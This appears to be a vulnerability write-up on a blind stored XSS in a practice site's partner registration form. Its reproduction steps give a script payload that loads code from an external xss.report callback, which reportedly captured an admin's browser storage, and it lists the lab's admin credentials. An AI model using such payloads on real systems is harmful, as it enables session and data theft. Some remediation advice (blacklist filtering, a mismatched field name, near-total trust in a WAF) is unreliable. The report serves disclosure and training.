## Title
Blind Stored XSS - Informatica

## Description
**Affected URL:** https://partners.pwnedbox.site/

A Blind Stored Cross-Site Scripting (XSS) vulnerability was identified in the partner registration functionality of the Informatica Cloud application. The Full Name and Company Name fields accept HTML/script content, which is stored and later displayed in the admin dashboard without proper output encoding.

A JavaScript payload using an external `xss.report` callback was submitted during registration. After the account was created and the stored data was viewed in the admin dashboard, a callback was recorded on the XSS reporting service. This demonstrates stored script execution in a separate administrative browsing context.

## Steps to Reproduce

1. Open the partner registration page: https://partners.pwnedbox.site/?view=register
2. Enter the following XSS payload in the Full Name field: `"><script src=https://xss.report/c/priyanshxop></script>`
3. Enter the payload in the Company Name field as shown in the screenshots.
4. Complete the required Email Address and Password fields.
5. Click Create Account to submit the registration form.
6. Verify that the application displays the account creation and registration success messages.
7. Access the Admin Portal and log in using the credentials shown in the lab:
   - Username: admin
   - Password: admin123
8. Navigate to the registered users section and locate the newly created account.
9. Observe that the submitted payload is stored and displayed in the user's Name and Company fields.
10. Check the XSS reporting dashboard at https://xss.report/ and verify that a callback associated with the affected partner page has been recorded.


## POC (Proof of Concept)

Screenshot 1: XSS payload entered in the Full Name and Company Name fields.

<img width="1918" height="960" alt="image" src="https://github.com/user-attachments/assets/9e7ae1e1-035e-4d7c-8583-cf9fa5708bc6" />

Screenshot 2: Registration success messages displayed after account creation.

<img width="1915" height="966" alt="image" src="https://github.com/user-attachments/assets/f3f057da-85a1-4736-8902-c149c95e723f" />

Screenshot 3: Admin login page showing the lab-provided administrator credentials.

<img width="1917" height="948" alt="image" src="https://github.com/user-attachments/assets/e971b51b-d474-4259-a176-1487b2429ad1" />

Screenshot 4: Admin dashboard displaying the stored payload in the registered user's record.

<img width="1918" height="957" alt="image" src="https://github.com/user-attachments/assets/364d4286-5801-4b8b-afec-12bbfc666c21" />

Screenshot 5: XSS reporting dashboard showing a callback associated with the affected partner page.

<img width="1918" height="971" alt="image" src="https://github.com/user-attachments/assets/d6cae6ac-c697-4f4e-acd4-ad28d96621e7" />

Screenshot 6: Callback details displaying browser storage and DOM information collected by the reporting service.

<img width="1913" height="950" alt="image" src="https://github.com/user-attachments/assets/12aaf2ba-9815-4fee-b58b-9ac7129dc087" />


## Impact
- An attacker may execute JavaScript in an administrator's authenticated browser session.
- Sensitive information accessible to the administrator's page, including session-related or browser storage data, may be exposed if accessible to the injected script.
- The attacker may perform unauthorized actions through the administrator's session, depending on the application's permissions and protections.

## Remediation
- Filter out HTML tags like: `<script>`, `<img>`, `<svg>` from the Report Name field before saving anything to the database
- Filter out JavaScript methods like: `alert()`, `confirm()`, `prompt()` so even if a tag slips through the method won't execute
- If you're using PHP then use `htmlspecialchars()` function before rendering any user input back to the page
- Use Cloudflare as they have so many WAF rules that almost all XSS payloads will be blocked automatically before even reaching the server
